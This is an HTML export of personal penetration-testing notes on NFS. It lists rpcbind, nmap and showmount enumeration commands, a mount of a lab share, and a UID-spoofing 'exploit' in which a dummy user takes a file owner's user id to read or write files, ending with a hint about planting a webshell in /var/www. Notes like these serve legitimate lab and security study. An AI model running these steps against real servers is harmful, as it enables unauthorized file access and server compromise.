<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>NFS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>NFS</h1><br/><p></p><p><h2>NFS Intro</h2><ul><li>port 111:rpcbind / 2049</li><li>access remote files as if they were in local directory</li></ul></p><p>•The Network File System (NFS) protocol is used by Linux systems to share files and folders.</p><p>• like smb<h3></h3></p><p><h3></h3><h2>NFS commands</h2><h3></h3></p><p><h3>•</h3><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># enumerate rpcbind </span><br />rpcbind -p <span style="color:#7f0044;font-weight:400">$target</span><br /><span style="color:#0088ff;font-weight:400"># enumerate </span><br />nmap -p 111 <span style="color:#7f0044;font-weight:400">$target</span> --script nfs<br /><span style="color:#0088ff;font-weight:400"># mount </span><br />showmount -e <span style="color:#7f0044;font-weight:400">$target</span> // enumerate dirs exported on the NFS<br /><span style="color:#ff9d00;font-weight:700">sudo</span> mount -t nfs 10.10.10.180:/site_backups backups/ <span style="color:#ff9d00;font-weight:700">&lt;</span>local directory<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#0088ff;font-weight:400">#~if smb2 =&gt; -__smbver=2.0</span></pre></div></p><p> </p><p><strong><h2> NFS exploit </h2></strong></p><p> <ul><li> <h3>NFS doesn&#39;t t track users / groups across machines. It just knows the ids, and uses the local system for that. For example, if I change the irc user to userid 1001, and the irc group to groupid 1001, then it looks like these files are owned by irc:</h3></li><li><h3>Exploit and get shell</h3><ul><li></li></ul></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## create dummy user: </span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> useradd dummy<br /><span style="color:#ff9d00;font-weight:700">sudo</span> su dummy -c bash <br /><span style="color:#0088ff;font-weight:400">## // change user id to match the one that owns the secret files</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> usermod -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user id<span style="color:#ff9d00;font-weight:700">&gt;</span> dummy  <br /><span style="color:#0088ff;font-weight:400"># exploit </span><br /><span style="color:#ff9d00;font-weight:700">echo</span> “test” <span style="color:#ff9d00;font-weight:700">&gt;</span>/mnt/test.txt<br /><br /><span style="color:#0088ff;font-weight:400">## example: if we control /var/www =&gt; control websehll</span></pre></div></p><p></p><p></p><p><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3></p></div>
</body>
</html>
